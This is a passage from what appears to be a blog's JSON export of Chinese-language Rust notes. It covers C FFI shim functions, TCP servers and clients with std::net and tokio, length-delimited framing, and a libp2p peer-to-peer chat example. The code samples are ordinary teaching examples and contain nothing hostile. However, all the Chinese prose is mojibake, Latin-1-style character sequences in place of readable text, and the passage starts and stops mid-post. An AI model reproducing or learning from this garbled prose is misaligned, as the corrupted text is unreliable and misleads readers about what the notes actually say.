å’Œæ•°æ®ç»“æ„æä¾›ç»™ C ä½¿ç”¨ï¼Œæˆ‘ä»¬é¦–å…ˆè¦æ„é€ ç›¸åº”çš„ Rust shim å±‚ï¼ŒæŠŠåŸæœ‰çš„ã€æ­£å¸¸çš„ Rust å®ç°å°è£…ä¸€ä¸‹ï¼Œä¾¿äº C è°ƒç”¨ã€‚ æä¾› Rust æ–¹æ³•ã€trait æ–¹æ³•ç­‰å…¬å¼€æ¥å£çš„ç‹¬ç«‹å‡½æ•°ã€‚æ³¨æ„ C æ˜¯ä¸æ”¯æŒæ³›å‹çš„ï¼Œæ‰€ä»¥å¯¹äºæ³›å‹å‡½æ•°ï¼Œéœ€è¦æä¾›å…·ä½“çš„ç”¨äºæŸä¸ªç±»å‹çš„ shim å‡½æ•°ã€‚ æ‰€æœ‰è¦æš´éœ²ç»™ C çš„ç‹¬ç«‹å‡½æ•°ï¼Œéƒ½è¦å£°æ˜æˆ #[no_mangle]ï¼Œä¸åšå‡½æ•°åç§°çš„æ”¹å†™ã€‚ æ•°æ®ç»“æ„éœ€è¦å¤„ç†æˆå’Œ C å…¼å®¹çš„ç»“æ„ã€‚å¦‚æœæ˜¯ä½ è‡ªå·±å®šä¹‰çš„ç»“æ„ä½“ï¼Œéœ€è¦ä½¿ç”¨ #[repr C]ï¼Œå¯¹äºè¦æš´éœ²ç»™ C çš„å‡½æ•°ï¼Œä¸èƒ½ä½¿ç”¨ String / Vec / Result è¿™äº› C æ— æ³•æ­£ç¡®æ“ä½œçš„æ•°æ®ç»“æ„ã€‚ è¦ä½¿ç”¨ catch_unwind æŠŠæ‰€æœ‰å¯èƒ½äº§ç”Ÿ panic! çš„ä»£ç åŒ…è£¹èµ·æ¥ã€‚å…¶å®ƒè¯­è¨€è°ƒç”¨ Rust æ—¶ï¼Œé‡åˆ° Rust çš„ panic!()ï¼Œä¼šå¯¼è‡´æœªå®šä¹‰çš„è¡Œä¸ºï¼Œæ‰€ä»¥åœ¨ FFI çš„è¾¹ç•Œå¤„ï¼Œè¦ catch_unwindï¼Œé˜»æ­¢ Rust æ ˆå›æº¯è·‘å‡º Rust çš„è¾¹ç•Œã€‚ ç¤ºä¾‹ï¼š 12345#[no_mangle]pub extern \"C\" fn hello_world() -&gt; *const c_char &#123; // C String ä»¥ \"\\0\" ç»“å°¾ \"hello world!\\0\".as_ptr() as *const c_char&#125; åœ¨ Cargo.toml ä¸­ï¼Œcrate ç±»å‹è¦è®¾ç½®ä¸º crate-type = [â€œcdylibâ€]ã€‚ ä¸‹é¢çš„ä»£ç å­˜åœ¨å†…å­˜æ³„æ¼ï¼š 123456#[no_mangle]pub extern \"C\" fn hello_bad(name: *const c_char) -&gt; *const c_char &#123; let s = unsafe &#123; CStr::from_ptr(name).to_str().unwrap() &#125;; format!(\"hello &#123;&#125;!\\\\0\", s).as_ptr() as *const c_char&#125; format!(\"hello {}!\\0\", s) ç”Ÿæˆäº†ä¸€ä¸ªå­—ç¬¦ä¸²ç»“æ„ï¼Œas_ptr() å–åˆ°å®ƒå †ä¸Šçš„èµ·å§‹ä½ç½®ï¼Œæˆ‘ä»¬ä¹Ÿä¿è¯äº†å †ä¸Šçš„å†…å­˜ä»¥ NULL ç»“å°¾ï¼Œçœ‹ä¸Šå»æ²¡æœ‰é—®é¢˜ã€‚ç„¶è€Œï¼Œåœ¨è¿™ä¸ªå‡½æ•°ç»“æŸæ‰§è¡Œæ—¶ï¼Œç”±äºå­—ç¬¦ä¸² s é€€å‡ºä½œç”¨åŸŸï¼Œæ‰€ä»¥å®ƒçš„å †å†…å­˜ä¼šè¢«è¿å¸¦ drop æ‰ã€‚å› æ­¤ï¼Œè¿™ä¸ªå‡½æ•°è¿”å›çš„æ˜¯ä¸€ä¸ªæ‚¬ç©ºçš„æŒ‡é’ˆï¼Œåœ¨ C é‚£ä¾§è°ƒç”¨æ—¶å°±ä¼šå´©æºƒã€‚ æ­£ç¡®çš„å†™æ³•åº”è¯¥æ˜¯ï¼š 1234567891011121314151617181920#[no_mangle]pub extern \"C\" fn hello(name: *const c_char) -&gt; *const c_char &#123; if name.is_null() &#123; return ptr::null(); &#125; if let Ok(s) = unsafe &#123; CStr::from_ptr(name).to_str() &#125; &#123; let result = format!(\"hello &#123;&#125;!\", s); // å¯ä»¥ä½¿ç”¨ unwrapï¼Œå› ä¸º result ä¸åŒ…å« \\0 let s = CString::new(result).unwrap(); s.into_raw() // ç›¸å½“äºï¼š // let p = s.as_ptr(); // std::mem::forget(s); // p &#125; else &#123; ptr::null() &#125;&#125; into_raw() æ¥è®© Rust ä¾§æ”¾å¼ƒå¯¹å†…å­˜çš„æ‰€æœ‰æƒã€‚æ›´å®‰å…¨çš„å†™æ³•ï¼Œéœ€è¦åŠ ä¸Š catch_unwindï¼Œæ¥é˜²æ­¢æ½œåœ¨çš„ panic!()ã€‚ 1234567891011121314151617181920212223#[no_mangle]pub extern \"C\" fn hello(name: *const c_char) -&gt; *const c_char &#123; if name.is_null() &#123; return ptr::null(); &#125; let result = catch_unwind(|| &#123; if let Ok(s) = unsafe &#123; CStr::from_ptr(name).to_str() &#125; &#123; let result = format!(\"hello &#123;&#125;!\", s); // å¯ä»¥ä½¿ç”¨ unwrapï¼Œå› ä¸º result ä¸åŒ…å« \\\\0 let s = CString::new(result).unwrap(); s.into_raw() &#125; else &#123; ptr::null() &#125; &#125;); match result &#123; Ok(s) =&gt; s, Err(_) =&gt; ptr::null(), &#125;&#125; å¦‚æœæ˜¯åœ¨ Rust ä¾§ç”³è¯·çš„å­—ç¬¦ä¸²ï¼Œä¹Ÿéœ€è¦ä½¿ç”¨ Rust æ‰€æœ‰æƒæœºåˆ¶æ¥é‡Šæ”¾å†…å­˜ï¼š 123456#[no_mangle]pub extern \"C\" fn free_str(s: *mut c_char) &#123; if !s.is_null() &#123; unsafe &#123; CString::from_raw(s) &#125;; &#125;&#125; C ä»£ç å¿…é¡»è¦è°ƒç”¨è¿™ä¸ªæ¥å£å®‰å…¨é‡Šæ”¾ Rust åˆ›å»ºçš„ CStringã€‚å¦‚æœä¸è°ƒç”¨ï¼Œä¼šæœ‰å†…å­˜æ³„æ¼ï¼›å¦‚æœä½¿ç”¨ C è‡ªå·±çš„ free()ï¼Œä¼šå¯¼è‡´æœªå®šä¹‰çš„é”™è¯¯ã€‚ å†™å¥½ Rust shim ä»£ç åï¼Œæ¥ä¸‹æ¥å°±æ˜¯ç”Ÿæˆ C çš„ FFI æ¥å£äº†ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œè¿™ä¸ªç¯èŠ‚å¯ä»¥ç”¨å·¥å…·æ¥è‡ªåŠ¨ç”Ÿæˆã€‚æ¯”å¦‚ï¼Œcbindgenã€‚","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"Rust","slug":"Notes/Rust","permalink":"https://racleray.github.io/categories/Notes/Rust/"}],"tags":[{"name":"Rust","slug":"Rust","permalink":"https://racleray.github.io/tags/Rust/"}],"author":"HeRui"},{"title":"RUST Part3","slug":"RUST-part3","date":"2024-11-09T12:31:22.317Z","updated":"2024-11-10T13:31:11.188Z","comments":true,"path":"posts/8110420.html","link":"","permalink":"https://racleray.github.io/posts/8110420.html","excerpt":"Rust Notes","text":"Rust Web OSI ä¸ƒå±‚æ¨¡å‹ä¸­ï¼Œä¸€èˆ¬å…³æ³¨æ¯”è¾ƒå¤šçš„æ˜¯ç½‘ç»œå±‚ï¼Œä¼ è¾“å±‚å’Œåº”ç”¨å±‚ã€‚Rust ä¸­å¯¹äºç½‘ç»œå¼€å‘çš„æ”¯æŒæ˜¯æ¯”è¾ƒå®Œå–„çš„ã€‚ low level çš„å¼€å‘å·¥å…·ï¼šlibpnet, smoltcp åºåˆ—åŒ–å·¥å…·ï¼šnom, serde ç½‘ç»œåŸºç¡€åº“ï¼štokio, std::net æ—¥å¿—åº“ï¼štracing, slog ç½‘ç»œå®‰å…¨æ”¯æŒï¼šrustls, orion, dalek-cryptography, ring, rustCrypto, snow åº”ç”¨å±‚ç½‘ç»œï¼šwarp, axum, hyper, reqwest, tungstenite, actix-web, rocket, tonic, quinn, quiche, s2n-quic p2p ç½‘ç»œï¼šlibp2p æ¯”å¦‚ï¼Œstd::net ä¸ºæ•´ä¸ª TCP/IP åè®®æ ˆçš„ä½¿ç”¨æä¾›äº†å°è£…ã€‚tokio::net æä¾›äº†å’Œ std::net å‡ ä¹ä¸€è‡´çš„å°è£…ï¼Œä¸”å®ç°äº†é«˜æ€§èƒ½çš„å¼‚æ­¥ç½‘ç»œã€‚ std::net std::net ä¸‹æä¾›äº†å¤„ç† TCP / UDP çš„æ•°æ®ç»“æ„ï¼Œä»¥åŠä¸€äº›è¾…åŠ©ç»“æ„ï¼š TCPï¼šTcpListener / TcpStreamï¼Œå¤„ç†æœåŠ¡å™¨çš„ç›‘å¬ä»¥åŠå®¢æˆ·ç«¯çš„è¿æ¥ UDPï¼šUdpSocketï¼Œå¤„ç† UDP socket IpAddr æ˜¯ IPv4 å’Œ IPv6 åœ°å€çš„å°è£…ï¼›SocketAddrï¼Œè¡¨ç¤º IP åœ°å€ + ç«¯å£çš„æ•°æ®ç»“æ„ server ç¤ºä¾‹ 1234567891011121314151617181920use std::&#123; io::&#123;Read, Write&#125;, net::TcpListener, thread,&#125;;fn main() &#123; let listener = TcpListener::bind(\"0.0.0.0:9527\").unwrap(); loop &#123; let (mut stream, addr) = listener.accept().unwrap(); println!(\"Accepted a new connection: &#123;&#125;\", addr); thread::spawn(move || &#123; let mut buf = [0u8; 12]; stream.read_exact(&amp;mut buf).unwrap(); println!(\"data: &#123;:?&#125;\", String::from_utf8_lossy(&amp;buf)); stream.write_all(b\"glad to meet you!\").unwrap(); &#125;); &#125;&#125; client ç¤ºä¾‹ 1234567891011121314use std::&#123; io::&#123;Read, Write&#125;, net::TcpStream,&#125;;fn main() &#123; let mut stream = TcpStream::connect(\"127.0.0.1:9527\").unwrap(); stream.write_all(b\"hello world!\").unwrap(); let mut buf = [0u8; 17]; stream.read_exact(&amp;mut buf).unwrap(); println!(\"data: &#123;:?&#125;\", String::from_utf8_lossy(&amp;buf));&#125; TcpStream è™½ç„¶æ²¡æœ‰å®ç° Drop traitï¼Œä½†æ˜¯å†…éƒ¨åŒ…è£…äº† sys_common::net::TcpStream ï¼Œç„¶åå®ƒåˆåŒ…è£…äº† Socketã€‚è€ŒSocket æ˜¯ä¸€ä¸ªå¹³å°ç›¸å…³çš„ç»“æ„ï¼Œæ¯”å¦‚ï¼Œåœ¨ Unix ä¸‹çš„å®ç°æ˜¯ FileDescï¼Œç„¶åå®ƒå†…éƒ¨æ˜¯ä¸€ä¸ª OwnedFdï¼Œæœ€ç»ˆä¼šè°ƒç”¨ libc::close(self.fd) æ¥å…³é—­ fdï¼Œä¹Ÿå°±å…³é—­äº† TcpStreamã€‚ å¦å¤–ï¼Œloop + spawn æ˜¯å¤„ç†ç½‘ç»œè¿æ¥çš„åŸºæœ¬æ–¹å¼ï¼Œä½†æ˜¯å¸¦æ¥çš„é—®é¢˜æ˜¯ï¼Œä½¿ç”¨çº¿ç¨‹å¤„ç†é¢‘ç¹è¿æ¥å’Œé€€å‡ºçš„ç½‘ç»œè¿æ¥ï¼Œä¼šæœ‰æ•ˆç‡ä¸Šçš„é—®é¢˜ï¼Œä»¥åŠçº¿ç¨‹é—´å¦‚ä½•å…±äº«å…¬å…±æ•°æ®ï¼Ÿ å¤§é‡è¿æ¥é—®é¢˜ ä»èµ„æºçš„è§’åº¦ï¼Œè¿‡å¤šçš„çº¿ç¨‹å ç”¨è¿‡å¤šçš„å†…å­˜ï¼ŒRust ç¼ºçœçš„æ ˆå¤§å°æ˜¯ 2Mï¼Œ10k è¿æ¥å°±ä¼šå ç”¨ 20G å†…å­˜ï¼ˆå¯ä»¥é€šè¿‡ std::thread::Builder::new().stack_size() ä¿®æ”¹é»˜è®¤æ ˆå¤§å°ï¼‰ï¼›ä»ç®—åŠ›çš„è§’åº¦ï¼Œå¤ªå¤šçº¿ç¨‹åœ¨è¿æ¥æ•°æ®åˆ°è¾¾æ—¶ï¼Œä¼šæ¥å›åˆ‡æ¢çº¿ç¨‹ï¼Œå¯¼è‡´ CPU å¿™ç¢Œï¼Œæ— æ³•å¤„ç†æ›´å¤šçš„è¿æ¥è¯·æ±‚ã€‚ å¯¹äºæ½œåœ¨çš„æœ‰å¤§é‡è¿æ¥çš„ç½‘ç»œæœåŠ¡ï¼Œä½¿ç”¨çº¿ç¨‹ä¸æ˜¯ä¸€ä¸ªå¥½çš„æ–¹å¼ã€‚ ä½¿ç”¨åç¨‹ç”±ä¸¤ç§å®ç°æ–¹å¼ï¼Œä¸€ç§æ˜¯ Golang é£æ ¼çš„æœ‰æ ˆåç¨‹ï¼Œä¸€ç§æ˜¯ Rust å¼‚æ­¥å¤„ç†è¿™æ ·çš„æ— æ ˆåç¨‹ã€‚æ¯”å¦‚ï¼Œä½¿ç”¨ tokio è¿™æ ·çš„åç¨‹åº“ã€‚ å…±äº«æ•°æ®é—®é¢˜ åœ¨ Rust çš„ç®€å•åœºæ™¯ä¸‹ï¼Œå¯ä½¿ç”¨ Arc&lt;T&gt; å¤„ç†ä¸éœ€è¦ä¿®æ”¹çš„å…±äº«ï¼Œä½¿ç”¨ Arc&lt;RwLock&lt;T&gt;&gt; å¤„ç†éœ€è¦è¿›è¡Œä¿®æ”¹çš„å…±äº«ã€‚ ä½¿ç”¨ Lock å¤„ç†æ—¶ï¼Œè‡ªç„¶ä¼šå½±å“ç³»ç»Ÿçš„ååé‡ã€‚ä¸€ç§æ–¹å¼æ—¶ï¼Œé™ä½é”çš„ç²’åº¦ï¼Œå°†ä¸€ä¸ªå…¨å±€é”ï¼Œåˆ†è§£ä¸ºå¤šä¸ªå±€éƒ¨çš„ç‹¬ç«‹çš„é”ã€‚å¦ä¸€ç§æ–¹å¼æ˜¯ï¼Œä½¿ç”¨å¼‚æ­¥æ¶ˆæ¯ï¼Œä»£æ›¿å…±äº«ç«äº‰ï¼Œæ¯”å¦‚ï¼šstd::sync::mpsc::channel, crossbeam_channel, tokio::sync::mpsc::channel, flume::unboundedã€‚ ç½‘ç»œæ•°æ® åœ¨ HTTP åè®®ä¸‹ï¼ŒåŸºæœ¬ä¸Šä½¿ç”¨ JSON æ„å»º REST API / JSON API ã€‚serde å®šä¹‰çš„ Rust æ•°æ®ç»“æ„å…·å¤‡ Serialize/Deserialize çš„èƒ½åŠ›ï¼Œç„¶åç”¨ serde_json ç”Ÿæˆåºåˆ—åŒ–åçš„ JSON æ•°æ®ã€‚ å¦‚æœéœ€è¦è‡ªå®šä¹‰åè®®ï¼Œå¯ä»¥ä½¿ç”¨TLVï¼ˆType-Length-Valueï¼‰çš„å½¢å¼æ¥æè¿°åè®®æ•°æ®ï¼Œæˆ–è€…ä½¿ç”¨ protobuf è¿™ç±»äºŒè¿›åˆ¶åè®®ã€‚ å½“æ¶ˆæ¯å†…å®¹æ˜¯ä¸å®šé•¿æ—¶ï¼Œéœ€è¦çº¦å®šå¥½å¦‚ä½•åŒºåˆ†æ¶ˆæ¯çš„è¾¹ç•Œï¼Œå¦‚ä½•è¯†åˆ«ä¸€ä¸ªå®Œæ•´çš„æ¶ˆæ¯å¸§ã€‚æ¯”å¦‚ï¼Œä½¿ç”¨ç‰¹æ®Šçš„è¾¹ç•Œç¬¦å·ï¼Œæˆ–è€…ä½¿ç”¨é•¿åº¦å­—æ®µã€‚gRPC ä½¿ç”¨äº†äº”ä¸ªå­—èŠ‚çš„ Length-Prefixed-Messageï¼ŒåŒ…å«ä¸€ä¸ªå­—èŠ‚çš„å‹ç¼©æ ‡å¿—å’Œå››ä¸ªå­—èŠ‚çš„æ¶ˆæ¯é•¿åº¦ã€‚åœ¨å¤„ç† gRPC æ¶ˆæ¯æ—¶ï¼Œå…ˆè¯»å– 5 ä¸ªå­—èŠ‚ï¼Œå–å‡ºé•¿åº¦ Nï¼Œå†è¯»å– N ä¸ªå­—èŠ‚çš„æ¶ˆæ¯å†…å®¹ã€‚ æ¶ˆæ¯å°¾æ·»åŠ  \\r\\n ä¸€èˆ¬ç”¨äºåŸºäºæ–‡æœ¬çš„åè®®ï¼Œæ¯”å¦‚ HTTP å¤´ / POP3 / Redis çš„ RESP åè®®ç­‰ã€‚ è€ŒåŸºäºäºŒè¿›åˆ¶çš„æ¶ˆæ¯ä½“ï¼Œåˆ™åœ¨æ¶ˆæ¯å‰åŠ å…¥æ¶ˆæ¯å†…å®¹é•¿åº¦å­—æ®µä¼šæ›´ç¨³å®šã€‚å½“ç„¶ä¸¤ç§æ–¹å¼ä¹Ÿå¯ä»¥ä¸€èµ·ä½¿ç”¨ã€‚ ä½¿ç”¨ LengthDelimitedCodec è‡ªåŠ¨æ·»åŠ å¸§å†…æ¶ˆæ¯å†…å®¹é•¿åº¦ 1234567891011121314151617181920212223242526use anyhow::Result;use bytes::Bytes;use futures::&#123;SinkExt, StreamExt&#125;;use tokio::net::TcpListener;use tokio_util::codec::&#123;Framed, LengthDelimitedCodec&#125;;#[tokio::main]async fn main() -&gt; Result&lt;()&gt; &#123; let listener = TcpListener::bind(\"127.0.0.1:9527\").await?; loop &#123; let (stream, addr) = listener.accept().await?; println!(\"accepted: &#123;:?&#125;\", addr); // LengthDelimitedCodec é»˜è®¤ 4 å­—èŠ‚é•¿åº¦ let mut stream = Framed::new(stream, LengthDelimitedCodec::new()); tokio::spawn(async move &#123; // è¿™é‡Œè§£æå¾—åˆ°çš„ data ä¼šåªåŒ…å«æ¶ˆæ¯ä¸»ä½“ï¼Œä¸åŒ…å«é•¿åº¦ while let Some(Ok(data)) = stream.next().await &#123; println!(\"Got: &#123;:?&#125;\", String::from_utf8_lossy(&amp;data)); // å‘é€çš„æ¶ˆæ¯åªéœ€è¦å†™å…¥æ¶ˆæ¯ä¸»ä½“ï¼Œä¸éœ€è¦æä¾›é•¿åº¦ // Framed/LengthDelimitedCodec ä¼šè‡ªåŠ¨è®¡ç®—å¹¶æ·»åŠ  stream.send(Bytes::from(\"goodbye world!\")).await.unwrap(); &#125; &#125;); &#125;&#125; client ç¤ºä¾‹ 123456789101112131415161718use anyhow::Result;use bytes::Bytes;use futures::&#123;SinkExt, StreamExt&#125;;use tokio::net::TcpStream;use tokio_util::codec::&#123;Framed, LengthDelimitedCodec&#125;;#[tokio::main]async fn main() -&gt; Result&lt;()&gt; &#123; let stream = TcpStream::connect(\"127.0.0.1:9527\").await?; let mut stream = Framed::new(stream, LengthDelimitedCodec::new()); stream.send(Bytes::from(\"hello world\")).await?; if let Some(Ok(data)) = stream.next().await &#123; println!(\"Got: &#123;:?&#125;\", String::from_utf8_lossy(&amp;data)); &#125; Ok(())&#125; å…¶å®ƒé—®é¢˜ é˜Ÿå¤´é˜»å¡é—®é¢˜ Web è¯·æ±‚å“åº”çš„æ¨¡å¼ä¸­ï¼Œå¯èƒ½å‡ºç°é˜Ÿå¤´é˜»å¡çš„é—®é¢˜ï¼ŒåŒ…æ‹¬ TCP é˜Ÿå¤´é˜»å¡ï¼Œä»¥åŠ HTTP é˜Ÿå¤´é˜»å¡ã€‚ ä¸€èˆ¬ HTTP åº”ç”¨å±‚é˜Ÿå¤´é˜»å¡ï¼Œå¯ä»¥é€šè¿‡åˆ†ç¦»æ§åˆ¶å¹³é¢å’Œæ•°æ®å¹³é¢æ¥è§£å†³ã€‚FTP, SIP å°±æ˜¯åˆ†ç¦»æ§åˆ¶å¹³é¢å’Œæ•°æ®å¹³é¢çš„å…¸å‹ä»£è¡¨ã€‚å¦å¤–ï¼ŒHTTP/2 é€šè¿‡å¤šè·¯å¤ç”¨ï¼Œå¯ä»¥å¹¶è¡Œå¤„ç†å¤šä¸ªè¯·æ±‚ï¼Œä¸åŒ stream ä¹‹é—´æ•°æ®å¯ä»¥ä¹±åºè¿”å›ï¼Œä»¥æ­¤è§£å†³ HTTP é˜Ÿå¤´é˜»å¡çš„é—®é¢˜ã€‚ HTTP/3 é€šè¿‡ QUIC åè®®ï¼Œåœ¨ UDP ä¸Šå®ç°äº†ç±»ä¼¼ TCP çš„å¯é ä¼ è¾“ï¼Œå¹¶ä¸”å®ç°äº†ç±»ä¼¼ HTTP/2 çš„å¤šè·¯å¤ç”¨ã€‚ P2P ç½‘ç»œ P2P ç½‘ç»œä¸­ï¼ŒèŠ‚ç‚¹ä¹‹é—´ç›´æ¥é€šä¿¡ï¼Œä¸éœ€è¦ç»è¿‡ä¸­å¿ƒæœåŠ¡å™¨ã€‚P2P ç½‘ç»œä¸­ï¼ŒèŠ‚ç‚¹ä¹‹é—´å¯èƒ½å­˜åœ¨å¤šæ¡é€šä¿¡è·¯å¾„ï¼ŒèŠ‚ç‚¹ä¹‹é—´å¯ä»¥ç›¸äº’é€šä¿¡ï¼ŒèŠ‚ç‚¹å¯ä»¥éšæ—¶åŠ å…¥å’Œç¦»å¼€ç½‘ç»œã€‚ P2P ç½‘ç»œä¸­ï¼ŒèŠ‚ç‚¹éœ€è¦å¤„ç† NAT ç©¿è¶Šé—®é¢˜ï¼ŒèŠ‚ç‚¹éœ€è¦å¤„ç†é˜²ç«å¢™ç©¿è¶Šé—®é¢˜ã€‚ ä¸»æµçš„è§£å†³æ–¹å¼æ˜¯ï¼Œä½¿ç”¨ STUN/TURN/ICE åè®®ï¼Œå‘ç°è‡ªå·±çš„å…¬ç½‘ IP/Port åœ°å€ï¼Œç„¶ååœ¨ bootstrap/signaling server ä¸­æ³¨å†Œè‡ªå·±çš„åœ°å€ï¼Œå¹¶å‘ç°é‚»å±…çš„åœ°å€ã€‚åœ¨æ­¤ä¹‹ä¸Šï¼ŒèŠ‚ç‚¹è¿˜å¯ä»¥åŠ å…¥æŸä¸ªæˆ–è€…æŸäº› topicï¼Œç„¶åé€šè¿‡æŸäº›åè®®ï¼ˆæ¯”å¦‚ gossipï¼‰åœ¨æ•´ä¸ª topic ä¸‹æ‰©æ•£æ¶ˆæ¯ã€‚ libp2p æ˜¯ Rust ä¸­æµè¡Œçš„ P2P ç½‘ç»œåº“ã€‚èŠ‚ç‚¹ä¹‹é—´é€šä¿¡åè®®æœ‰ï¼š èŠ‚ç‚¹å‘ç°: mDNS, bootstrap, Kad DHT å†…å®¹å‘ç°ï¼šgossipsub, floodsub, Kad DHT èŠ‚ç‚¹è·¯ç”±ï¼šKad DHT åœ¨ç½‘ç»œå®‰å…¨æ–¹é¢ï¼ŒTLS è™½ç„¶èƒ½å¾ˆå¥½åœ°ä¿æŠ¤å®¢æˆ·ç«¯/æœåŠ¡å™¨æ¨¡å‹ï¼Œç„¶è€Œè¯ä¹¦çš„åˆ›å»ºã€å‘æ”¾ä»¥åŠä¿¡ä»»å¯¹ P2P ç½‘ç»œæ˜¯ä¸ªé—®é¢˜ï¼Œæ‰€ä»¥ P2P ç½‘ç»œå€¾å‘äºä½¿ç”¨è‡ªå·±çš„å®‰å…¨åè®®ï¼Œæˆ–è€…ä½¿ç”¨ noise protocolï¼Œæ¥æ„å»ºå®‰å…¨ç­‰çº§å¯ä»¥åª²ç¾ TLS 1.3 çš„å®‰å…¨åè®®ã€‚ ä¸€ä¸ªç®€å•çš„ç¤ºä¾‹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124use anyhow::Result;use futures::StreamExt;use libp2p::&#123; core::upgrade, floodsub::&#123;self, Floodsub, FloodsubEvent, Topic&#125;, identity, mdns::&#123;Mdns, MdnsEvent&#125;, noise, swarm::&#123;NetworkBehaviourEventProcess, SwarmBuilder, SwarmEvent&#125;, tcp::TokioTcpConfig, yamux, NetworkBehaviour, PeerId, Swarm, Transport,&#125;;use std::borrow::Cow;use tokio::io::&#123;stdin, AsyncBufReadExt, BufReader&#125;;/// å¤„ç† p2p ç½‘ç»œçš„ behavior æ•°æ®ç»“æ„#[derive(NetworkBehaviour)]#[behaviour(event_process = true)]struct ChatBehavior &#123; /// flood subscriptionï¼Œæ¯”è¾ƒæµªè´¹å¸¦å®½ï¼Œgossipsub æ˜¯æ›´å¥½çš„é€‰æ‹© floodsub: Floodsub, /// æœ¬åœ°èŠ‚ç‚¹å‘ç°æœºåˆ¶ mdns: Mdns,&#125;impl ChatBehavior &#123; /// åˆ›å»ºä¸€ä¸ªæ–°çš„ ChatBehavior pub async fn new(id: PeerId) -&gt; Result&lt;Self&gt; &#123; Ok(Self &#123; mdns: Mdns::new(Default::default()).await?, floodsub: Floodsub::new(id), &#125;) &#125;&#125;impl NetworkBehaviourEventProcess&lt;FloodsubEvent&gt; for ChatBehavior &#123; // å¤„ç† floodsub äº§ç”Ÿçš„æ¶ˆæ¯ fn inject_event(&amp;mut self, event: FloodsubEvent) &#123; if let FloodsubEvent::Message(msg) = event &#123; let text = String::from_utf8_lossy(&amp;msg.data); println!(\"&#123;:?&#125;: &#123;:?&#125;\", msg.source, text); &#125; &#125;&#125;impl NetworkBehaviourEventProcess&lt;MdnsEvent&gt; for ChatBehavior &#123; fn inject_event(&amp;mut self, event: MdnsEvent) &#123; match event &#123; MdnsEvent::Discovered(list) =&gt; &#123; // æŠŠ mdns å‘ç°çš„æ–°çš„ peer åŠ å…¥åˆ° floodsub çš„ view ä¸­ for (id, addr) in list &#123; println!(\"Got peer: &#123;&#125; with addr &#123;&#125;\", &amp;id, &amp;addr); self.floodsub.add_node_to_partial_view(id); &#125; &#125; MdnsEvent::Expired(list) =&gt; &#123; // æŠŠ mdns å‘ç°çš„ç¦»å¼€çš„ peer åŠ å…¥åˆ° floodsub çš„ view ä¸­ for (id, addr) in list &#123; println!(\"Removed peer: &#123;&#125; with addr &#123;&#125;\", &amp;id, &amp;addr); self.floodsub.remove_node_from_partial_view(&amp;id); &#125; &#125; &#125; &#125;&#125;#[tokio::main]async fn main() -&gt; Result&lt;()&gt; &#123; let name = match std::env::args().nth(1) &#123; Some(arg) =&gt; Cow::Owned(arg), None =&gt; Cow::Borrowed(\"default\"), &#125;; // åˆ›å»º floodsub topic let topic = floodsub::Topic::new(name); // åˆ›å»º swarm let mut swarm = create_swarm(topic.clone()).await?; swarm.listen_on(\"/ip4/127.0.0.1/tcp/0\".parse()?)?; let mut stdin = BufReader::new(stdin()).lines(); loop &#123; tokio::select! &#123; line = stdin.next_line() =&gt; &#123; let line = line?.expect(\"stdin closed\"); swarm.behaviour_mut().floodsub.publish(topic.clone(), line.as_bytes()); &#125; event = swarm.select_next_some() =&gt; &#123; if let SwarmEvent::NewListenAddr &#123; address, .. &#125; = event &#123; println!(\"Listening on &#123;:?&#125;\", address); &#125; &#125; &#125; &#125;&#125;async fn create_swarm(topic: Topic) -&gt; Result&lt;Swarm&lt;ChatBehavior&gt;&gt; &#123; // åˆ›å»º identityï¼ˆå¯†é’¥å¯¹ï¼‰ let id_keys = identity::Keypair::generate_ed25519(); let peer_id = PeerId::from(id_keys.public()); println!(\"Local peer id: &#123;:?&#125;\", peer_id); // ä½¿ç”¨ noise protocol æ¥å¤„ç†åŠ å¯†å’Œè®¤è¯ let noise_keys = noise::Keypair::&lt;noise::X25519Spec&gt;::new().into_authentic(&amp;id_keys)?; // åˆ›å»ºä¼ è¾“å±‚ let transport = TokioTcpConfig::new() .nodelay(true) .upgrade(upgrade::Version::V1) .authenticate(noise::NoiseConfig::xx(noise_keys).into_authenticated()) .multiplex(yamux::YamuxConfig::default()) .boxed(); let mut behavior = ChatBehavior::new(peer_id.clone()).await?; behavior.floodsub.subscribe(topic.clone()); let swarm = SwarmBuilder::new(transport, behavior, peer_id) .executor(Box::new(|fut| &#123; tokio::spawn(fut); &#125;)) .build(); Ok(swarm)&#125;","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"Rust","slug":"Notes/Rust","permalink":"https://racleray.github.io/categories/Notes/Rust/"}],"tags":[{"name":"Rust","slug":"Rust","permalink":"https://racleray.github.io/tags/Rust/"}],"author":"HeRui"},{"title":"RUST Part2","slug":"rust-part2","date":"2024-10-22T13:19:35.225Z","updated":"2024-11-09T12:30:42.322Z","comments":true,"path":"posts/7f1634b6.html","link":"","permalink":"https://racleray.github.io/posts/7f1634b6.html","excerpt":"Rust Notes","text":"é”™è¯¯å¤„ç† é”™è¯¯å¤„ç†ï¼ŒåŒ…å«æ•è·ã€ä¼ æ’­ã€å¤„ç†ã€‚å¤„ç†æ–¹æ³•å¸¸è§æœ‰ï¼Œä½¿ç”¨è¿”å›å€¼ï¼ˆGolangï¼‰ï¼Œä½¿ç”¨å¼‚å¸¸ï¼ˆPythonï¼ŒC++ï¼‰ï¼Œä½¿ç”¨ç±»å‹ç³»ç»Ÿï¼ˆRustï¼ŒHaskellï¼‰ã€‚ ä½¿ç”¨è¿”å›å€¼æ—¶ï¼Œé”™è¯¯éœ€è¦ç«‹å³å¤„ç†æˆ–è€…æ˜¾å¼ä¼ é€’ã€‚ä½¿ç”¨å¼‚å¸¸éœ€è¦å¼€å‘è€…å¯¹å…¶æœ‰è¾ƒå¥½çš„ç†è§£å’ŒæŠŠæ§ï¼Œå¹³è¡¡å¥½å¼‚å¸¸å¤„ç†çš„å¼€é”€ã€‚ Rust ä½¿ç”¨ç±»ä¼¼ Haskell çš„ç±»å‹è®¾è®¡ï¼Œä½¿ç”¨ Option å’Œ Result ä½œä¸ºä¸€ä¸ªå†…éƒ¨åŒ…å«æ­£å¸¸è¿”å›ç±»å‹å’Œé”™è¯¯è¿”å›ç±»å‹çš„å¤åˆç±»å‹ã€‚ Result ç±»å‹å£°æ˜æ—¶è¿˜æœ‰ä¸ª must_use çš„æ 